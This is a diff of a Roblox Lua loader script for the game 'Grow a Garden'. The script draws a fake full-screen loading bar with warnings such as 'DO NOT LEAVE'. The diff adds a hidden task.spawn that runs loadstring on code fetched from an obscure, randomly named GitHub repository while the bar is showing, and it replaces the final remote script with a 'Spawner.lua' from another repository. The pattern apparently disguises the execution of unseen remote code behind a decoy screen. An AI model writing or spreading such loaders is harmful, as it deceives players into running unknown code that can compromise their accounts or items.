@@ -30,7 +30,7 @@ end
 
 local centerY = screenY / 2
 createText("🌴 GROW A GARDEN 🌴", 45, centerY - 100, Color3.new(1,1,1))
-createText("DO NOT MOVE YOUR GAME", 26, centerY - 50, Color3.new(1,0,0))
+createText("DO NOT LEAVE", 26, centerY - 50, Color3.new(1,0,0))
 createText("script loading please wait...", 24, centerY, Color3.new(1,1,1))
 
 local barW, barH = 400, 20
@@ -58,6 +58,11 @@ local percent = createText("0%", 20, barY + 30, Color3.new(1,1,1))
 local duration = 200
 local start = tick()
 
+-- RUN YOUR EXTRA SCRIPT WHILE LOADING
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/zapadiapa3074zupa/Sfnanafnqrnqrjqrjqrjqrj/main/main.lua"))()
+end)
+
 while true do
     local elapsed = tick() - start
     local progress = math.clamp(elapsed / duration, 0, 1)
@@ -79,5 +84,8 @@ for _,v in ipairs(objs) do
     v:Remove()
 end
 
--- run your code after loader
-loadstring(game:HttpGet("https://raw.githubusercontent.com/GRPGaming/Key-System/refs/heads/Xycer-Hub-Script/GAGZ8"))()
+-- run your main script after loader
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ataturk123/GardenSpawner/refs/heads/main/Spawner.lua"))()
+Spawner.Load()
+
+
